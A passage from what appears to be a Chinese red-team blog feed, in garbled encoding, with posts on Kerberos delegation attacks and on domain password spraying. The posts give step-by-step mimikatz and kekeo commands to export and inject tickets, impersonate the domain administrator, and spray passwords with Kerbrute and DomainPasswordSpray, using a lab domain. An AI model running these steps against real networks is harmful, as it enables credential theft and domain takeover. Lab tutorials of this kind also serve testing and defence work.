title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>å§”æ´¾ä¸€èˆ¬å‡ºç°åœ¨åŸŸç¯å¢ƒä¸­ï¼ŒæŒ‡å°†åŸŸå†…ç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦å·ï¼Œä½¿å¾—æœåŠ¡è´¦å·èƒ½ä»¥ç”¨æˆ·æƒé™è®¿é—®åŸŸå†…çš„å…¶ä»–æœåŠ¡ï¼Œå³å‡è®¾Aç”¨æˆ·è®¿é—®æœåŠ¡Bæ—¶ï¼ŒæœåŠ¡Bæ‹¿ç€Aç”¨æˆ·çš„å‡­è¯å»è®¿é—®æœåŠ¡Cï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºå§”æ´¾ã€‚åŸŸå†…å§”æ´¾ä¸»è¦æœ‰ä¸‰ç§ç±»å‹ï¼šéçº¦æŸæ€§å§”æ´¾ã€çº¦æŸæ€§å§”æ´¾ä»¥åŠåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚æœ¬æ–‡ä¸»è¦ä»‹ç»éçº¦æŸæ€§å§”æ´¾åŠçº¦æŸæ€§å§”æ´¾æ”»å‡»æ‰‹æ³•ã€‚</p><h2 id="äºŒã€éçº¦æŸæ€§å§”æ´¾"><a href="#äºŒã€éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="äºŒã€éçº¦æŸæ€§å§”æ´¾"></a>äºŒã€éçº¦æŸæ€§å§”æ´¾</h2><p>è‹¥é…ç½®äº†éçº¦æŸæ€§å§”æ´¾ï¼ŒæœåŠ¡è´¦æˆ·å¯ä»¥è·å–è¢«å§”æ´¾ç”¨æˆ·çš„TGTç¥¨æ®ï¼Œå¹¶å°†TGTç¥¨æ®ç¼“å­˜åˆ°lsassè¿›ç¨‹ä¸­ï¼Œä»è€ŒæœåŠ¡è´¦æˆ·å¯ä½¿ç”¨è¯¥TGTç¥¨æ®æ¨¡æ‹Ÿè¯¥ç”¨æˆ·è®¿é—®ä»»æ„æœåŠ¡ã€‚åœ¨åŸŸæ§ä¸­é»˜è®¤é…ç½®äº†éçº¦æŸæ€§å§”æ´¾ã€‚</p><h3 id="æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·"><a href="#æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·" class="headerlink" title="æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·"></a>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·</h3><p>åˆ©ç”¨ ADfind å¯»æ‰¾åŸŸå†…é…ç½®äº†éçº¦æŸå§”æ´¾æœåŠ¡è´¦å·ï¼Œ<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">ç‚¹å‡»ä¸‹è½½</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=åŸŸåå‰ç¼€,DC=åŸŸååç¼€&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure></div><p>è´¦æˆ· saulgoodman é…ç½®äº†éçº¦æŸæ€§å§”æ´¾ </p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124220444429.png" data-caption="image-20230124220444429"><img src="/../images/domain/appoint/image-20230124220444429.png" alt="image-20230124220444429"></a></p><p>åŸŸæ§ä¸‹è¯¥è´¦æˆ·é…ç½®å¦‚ä¸‹</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124223151897.png" data-caption="image-20230124223151897"><img src="/../images/domain/appoint/image-20230124223151897.png" alt="image-20230124223151897"></a></p><h3 id="æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„ä¸»æœº"><a href="#æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„ä¸»æœº" class="headerlink" title="æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„ä¸»æœº"></a>æŸ¥æ‰¾åŸŸä¸­é…ç½®éçº¦æŸæ€§å§”æ´¾çš„ä¸»æœº</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=åŸŸåå‰ç¼€,DC=åŸŸååç¼€&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure></div><p>OWAã€SQLSERVER-2008 ä¸»æœºé…ç½®äº†éçº¦æŸæ€§å§”æ´¾</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124220545872.png" data-caption="image-20230124220545872"><img src="/../images/domain/appoint/image-20230124220545872.png" alt="image-20230124220545872"></a></p><p>åŸŸæ§ä¸‹é…ç½®å¦‚ä¸‹å›¾</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124223317529.png" data-caption="image-20230124223317529"><img src="/../images/domain/appoint/image-20230124223317529.png" alt="image-20230124223317529"></a></p><h3 id="éçº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#éçº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>éçº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| ç¯å¢ƒ           | åç§°           |</span><br><span class="line">| -------------- | -------------- |</span><br><span class="line">| åŸŸæ§ä¸»æœº       | owa            |</span><br><span class="line">| åŸŸæ§ç®¡ç†å‘˜     | administrator  |</span><br><span class="line">| åŸŸå†…æˆå‘˜ä¸»æœº   | sqlserver-2008 |</span><br><span class="line">| åŸŸæˆå‘˜æ™®é€šè´¦å· | sqlserver      |</span><br><span class="line">| åŸŸå           | redteam.red    |</span><br></pre></td></tr></table></figure></div><p>1ã€åˆ©ç”¨ mimikatz æ¸…ç†åŸŸå†…æˆå‘˜ä¸»æœºç¥¨æ®</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224345035.png" data-caption="image-20230124224345035"><img src="/../images/domain/appoint/image-20230124224345035.png" alt="image-20230124224345035"></a></p><p>è¿™æ˜¯åŸŸæ§æœªè®¿é—®ä¸»æœºå‰çš„ç¥¨æ®ï¼Œåˆ©ç”¨ mimikatz å¯¼å‡ºï¼Œå­˜å‚¨åœ¨ mimikatz ç›®å½•ä¸‹</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224822348.png" data-caption="image-20230124224822348"><img src="/../images/domain/appoint/image-20230124224822348.png" alt="image-20230124224822348"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224959236.png" data-caption="image-20230124224959236"><img src="/../images/domain/appoint/image-20230124224959236.png" alt="image-20230124224959236"></a></p><p>2ã€åœ¨åŸŸæ§æœºå™¨ä¸Šæ¨¡æ‹Ÿç®¡ç†å‘˜è´¦å·è¿œç¨‹IPCè¿æ¥åŸŸæˆå‘˜ä¸»æœºã€‚å½“æˆåŠŸè®¿é—®åï¼ŒåŸŸæˆå‘˜ä¸»æœºçš„ lsass.exe å†…å­˜ä¸­å°±ä¼šæœ‰åŸŸç®¡ç†å‘˜ administrator çš„ TGT ç¥¨æ®ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\åŸŸå†…æˆå‘˜ä¸»æœºå.åŸŸå /user:åŸŸç®¡ç†å‘˜è´¦æˆ· å¯†ç </span><br><span class="line"></span><br><span class="line">net use \\sqlserver-2008.redteam.red /user:redteam\administrator redteam!@#45</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124225538151.png" data-caption="image-20230124225538151"><img src="/../images/domain/appoint/image-20230124225538151.png" alt="image-20230124225538151"></a></p><p>4ã€åŸŸæˆå‘˜ä¸»æœºå†æ¬¡åˆ©ç”¨ mimikatz å¯¼å‡ºç¥¨æ®ï¼Œæ­¤æ—¶å¤šäº†ä¸€ä¸ªåŸŸç®¡ç†å‘˜çš„ç¥¨æ®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230011442.png" data-caption="image-20230124230011442"><img src="/../images/domain/appoint/image-20230124230011442.png" alt="image-20230124230011442"></a></p><p>5ã€åˆ©ç”¨ mimikatz è¿›è¡Œå¯¼å…¥ç¥¨æ®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ppt [0;8ddacc]-2-0-60a00000-Administrator@krbtgt-REDTEAM.RED.kirbi# å¯¼å…¥ç¥¨æ®</span><br><span class="line">kerberos::list # æŸ¥çœ‹ç¥¨æ®</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230229053.png" data-caption="image-20230124230229053"><img src="/../images/domain/appoint/image-20230124230229053.png" alt="image-20230124230229053"></a></p><p>6ã€åŸŸå†…æˆå‘˜ä¸»æœºæˆåŠŸè®¿é—®åŸŸæ§</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230444983.png" data-caption="image-20230124230444983"><img src="/../images/domain/appoint/image-20230124230444983.png" alt="image-20230124230444983"></a></p><h2 id="ä¸‰ã€çº¦æŸæ€§å§”æ´¾"><a href="#ä¸‰ã€çº¦æŸæ€§å§”æ´¾" class="headerlink" title="ä¸‰ã€çº¦æŸæ€§å§”æ´¾"></a>ä¸‰ã€çº¦æŸæ€§å§”æ´¾</h2><p>è‹¥é…ç½®äº†çº¦æŸæ€§å§”æ´¾ï¼ŒæœåŠ¡è´¦å·åªèƒ½è·å–è¯¥ç”¨æˆ·å¯¹æŒ‡å®šæœåŠ¡çš„STç¥¨æ®ï¼Œä»è€Œåªèƒ½æ¨¡æ‹Ÿè¯¥ç”¨æˆ·è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚</p><h3 id="æŸ¥çœ‹åŸŸå†…çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·"><a href="#æŸ¥çœ‹åŸŸå†…çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·" class="headerlink" title="æŸ¥çœ‹åŸŸå†…çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·"></a>æŸ¥çœ‹åŸŸå†…çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·</h3><p>åˆ©ç”¨ ADfind å¯»æ‰¾åŸŸå†…é…ç½®äº†çº¦æŸå§”æ´¾æœåŠ¡è´¦å·ï¼Œ<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">ç‚¹å‡»ä¸‹è½½</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=åŸŸåå‰ç¼€,DC=åŸŸååç¼€&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105511373.png" data-caption="image-20230126105511373"><img src="/../images/domain/appoint/image-20230126105511373.png" alt="image-20230126105511373"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126102412371.png" data-caption="image-20230126102412371"><img src="/../images/domain/appoint/image-20230126102412371.png" alt="image-20230126102412371"></a></p><h3 id="çº¦æŸæ€§å§”æ´¾æ”»å‡»"><a href="#çº¦æŸæ€§å§”æ´¾æ”»å‡»" class="headerlink" title="çº¦æŸæ€§å§”æ´¾æ”»å‡»"></a>çº¦æŸæ€§å§”æ´¾æ”»å‡»</h3><p>1ã€å·²çŸ¥åŸŸæ§ç®¡ç†å‘˜æ˜æ–‡ï¼Œåœ¨é…ç½®äº†åˆ©ç”¨çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡çš„åŸŸæˆå‘˜æœºå™¨ä¸Šåˆ©ç”¨kekeoè¯·æ±‚TGTæœåŠ¡ï¼Œè·å–TGTç¥¨æ®</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å· /domain:åŸŸå /password:çº¦æŸæ€§å§”æ´¾çš„æœåŠ¡è´¦å·å¯†ç </span><br><span class="line"></span><br><span class="line">tgt::ask /user:sqlserver /domain:redteam.red /password:admin2345</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126104927953.png" data-caption="image-20230126104927953"><img src="/../images/domain/appoint/image-20230126104927953.png" alt="image-20230126104927953"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105037069.png" data-caption="image-20230126105037069"><img src="/../images/domain/appoint/image-20230126105037069.png" alt="image-20230126105037069"></a></p><p>2ã€åˆ©ç”¨è¯·æ±‚åˆ°çš„TGTç¥¨æ®ï¼Œä½¿ç”¨S4Uåè®®å¹¶ä¼ªé€ administratorèº«ä»½è®¿é—®æœåŠ¡ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:è¯·æ±‚åˆ°çš„TGTç¥¨æ® /user:Administrator@åŸŸå /service:cifs/å¯¹åº”çš„ä¸»æœºå</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105818800.png" data-caption="image-20230126105818800"><img src="/../images/domain/appoint/image-20230126105818800.png" alt="image-20230126105818800"></a></p><p>è·å–åˆ°ä¸¤å¼ STï¼Œä¸€å¼ æ˜¯cifs&#x2F;owa.redteam.redæœåŠ¡çš„ï¼Œå¦ä¸€å¼ æ˜¯sqlserveræœåŠ¡çš„</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110008259.png" data-caption="image-20230126110008259"><img src="/../images/domain/appoint/image-20230126110008259.png" alt="image-20230126110008259"></a></p><p>3ã€ä½¿ç”¨ mimikatz å°†ç¥¨æ®å¯¼å…¥å³å¯è®¿é—® cifs&#x2F;owa.redteam.red æœåŠ¡</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt cifsä¸»æœºæœåŠ¡ç¥¨æ®</span><br><span class="line"></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110700172.png" data-caption="image-20230126110700172"><img src="/../images/domain/appoint/image-20230126110700172.png" alt="image-20230126110700172"></a></p><p>æœªè¿›è¡Œçº¦æŸæ€§å§”æ´¾æ”»å‡»å‰ä¸èƒ½è®¿é—®åŸŸæ§</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110548968.png" data-caption="image-20230126110548968"><img src="/../images/domain/appoint/image-20230126110548968.png" alt="image-20230126110548968"></a></p><p>è¿›è¡Œçº¦æŸæ€§å§”æ´¾æ”»å‡»åæˆåŠŸè®¿é—®åŸŸæ§</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110756652.png" data-caption="image-20230126110756652"><img src="/../images/domain/appoint/image-20230126110756652.png" alt="image-20230126110756652"></a></p><h2 id="äº”ã€æ€»ç»“"><a href="#äº”ã€æ€»ç»“" class="headerlink" title="äº”ã€æ€»ç»“"></a>äº”ã€æ€»ç»“</h2><p>æœ¬æ–‡ç®€å•é˜è¿°äº†éçº¦æŸæ€§å§”æ´¾åŠçº¦æŸæ€§å§”æ´¾çš„åŸºæœ¬åŸç†åŠåŸºæœ¬çš„æ”»å‡»æ‰‹æ³•ï¼ŒåŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾éƒ¨åˆ†åç»­æœ‰æ—¶é—´å†æ›´æ–°ã€‚</p><h2 id="å…­ã€å‚è€ƒ"><a href="#å…­ã€å‚è€ƒ" class="headerlink" title="å…­ã€å‚è€ƒ"></a>å…­ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</span><br><span class="line">https://github.com/gentilkiwi/kekeo</span><br><span class="line">https://github.com/Kevin-Robertson/Powermad</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br><span class="line">https://cloud.tencent.com/developer/article/1899592</span><br><span class="line">https://cloud.tencent.com/developer/article/1861371</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åŸŸæ¸—é€ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> çº¦æŸæ€§å§”æ´¾ </tag>
            
            <tag> éçº¦æŸæ€§å§”æ´¾ </tag>
            
            <tag> åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€ç³»åˆ—-åŸŸå†…ç”¨æˆ·åæšä¸¾åŠå¯†ç å–·æ´’</title>
      <link href="/2023/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%8F%8A%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/"/>
      <url>/2023/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%8F%8A%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h2><p>è¿›è¡ŒåŸŸæ¸—é€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æšä¸¾åŸŸå†…ç”¨æˆ·è´¦å·ç„¶åå†åˆ©ç”¨å·¥å…·è¿›è¡Œå¯†ç å–·æ´’ï¼Œå°†å·²æœ‰æˆæœæœ€å¤§åŒ–ï¼ŒåŸºæœ¬åŸç†ç±»ä¼¼æš´åŠ›ç ´è§£ï¼Œæœ¬æ–‡ä¸»è¦ç®€è¿°å‡ æ¬¾å·¥å…·åŸºæœ¬çš„ä½¿ç”¨æ–¹æ³•ã€‚</p><h2 id="äºŒã€åŸŸå†…ç”¨æˆ·åæšä¸¾"><a href="#äºŒã€åŸŸå†…ç”¨æˆ·åæšä¸¾" class="headerlink" title="äºŒã€åŸŸå†…ç”¨æˆ·åæšä¸¾"></a>äºŒã€åŸŸå†…ç”¨æˆ·åæšä¸¾</h2><h3 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>kerbrute åŸºäº Go è¯­è¨€ç¼–å†™çš„åŸŸå†…ç”¨æˆ·åæšä¸¾åŠå¯†ç å–·æ´’å·¥å…·ã€‚è·å–åŸŸå†…ä¸€ä¸»æœºæƒé™åï¼Œæ•´åˆå·²æ”¶é›†åˆ°çš„ä¿¡æ¯æˆ–æ—¥å¸¸æ”¶é›†åˆ°çš„ç”¨æˆ·ååˆ¶ä½œæˆå­—å…¸ï¼Œåˆ©ç”¨kerbruteè¿›è¡ŒåŸŸå†…è¿›è¡Œç”¨æˆ·åæšä¸¾</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc åŸŸæ§IP -d åŸŸå æŒ‡å®šç”¨æˆ·åæ–‡ä»¶.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124151726168.png" data-caption="image-20230124151726168"><img src="/../images/domain/user&pass/image-20230124151726168.png" alt="image-20230124151726168"></a></p><h3 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h3><p>DomainPasswordSpray æ˜¯ä¸€ç§ç”¨ PowerShell ç¼–å†™çš„å·¥å…·ï¼Œç”¨äºå¯¹åŸŸç”¨æˆ·æ‰§è¡Œå¯†ç å–·å°„æ”»å‡»ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå°†è‡ªåŠ¨ä»åŸŸä¸­ç”Ÿæˆç”¨æˆ·åˆ—è¡¨å¹¶æ’é™¤è¢«ç¦ç”¨å’Œè¢«é”å®šçš„ç”¨æˆ·</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;&amp;&#123;import-module .\DomainPasswordSpray.ps1; Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts| Out-File -Encoding ascii userlist.txt &#125;&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124155900635.png" data-caption="image-20230124155900635"><img src="/../images/domain/user&pass/image-20230124155900635.png" alt="image-20230124155900635"></a></p><h2 id="ä¸‰ã€åŸŸå†…å¯†ç å–·æ´’"><a href="#ä¸‰ã€åŸŸå†…å¯†ç å–·æ´’" class="headerlink" title="ä¸‰ã€åŸŸå†…å¯†ç å–·æ´’"></a>ä¸‰ã€åŸŸå†…å¯†ç å–·æ´’</h2><h3 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>æŒ‡å®šå¯†ç å–·æ´’</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute passwordspray -d åŸŸå --dc åŸŸæ§IP ç”¨æˆ·å.txt æŒ‡å®šå¯†ç ï¼ˆPassword123ï¼‰</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124163410723.png" data-caption="image-20230124163410723"><img src="/../images/domain/user&pass/image-20230124163410723.png" alt="image-20230124163410723"></a></p><h3 id="DomainPasswordSpray-1"><a href="#DomainPasswordSpray-1" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h3><p>æŒ‡å®šUserListè¿›è¡Œå¯†ç å–·æ´’æš´ç ´</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;&amp;&#123;import-module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -UserList username.txt -Password admin!@#45 -Verbose&#125;&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124164438885.png" data-caption="image-20230124164438885"><img src="/../images/domain/user&pass/image-20230124164438885.png" alt="image-20230124164438885"></a></p><h3 id="è¶…çº§å¼±å£ä»¤å·¥å…·"><a href="#è¶…çº§å¼±å£ä»¤å·¥å…·" class="headerlink" title="è¶…çº§å¼±å£ä»¤å·¥å…·"></a>è¶…çº§å¼±å£ä»¤å·¥å…·</h3><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124162831697.png" data-caption="image-20230124162831697"><img src="/../images/domain/user&pass/image-20230124162831697.png" alt="image-20230124162831697"></a></p><h2 id="å››ã€å‚è€ƒ"><a href="#å››ã€å‚è€ƒ" class="headerlink" title="å››ã€å‚è€ƒ"></a>å››ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/3kV9pT0Zxrv8KUKg2N8O4Q</span><br><span class="line">https://github.com/ropnop/kerbrute</span><br><span class="line">https://github.com/dafthack/DomainPasswordSpray</span><br><span class="line">https://github.com/shack2/SNETCracker</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> åŸŸæ¸—é€ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å–·æ´’ </tag>
            
            <tag> ç”¨æˆ·æšä¸¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€ç³»åˆ—-åŸºç¡€çŸ¥è¯†ç¯‡</title>
      <link href="/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87/"/>
      <url>/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87/</url>
      
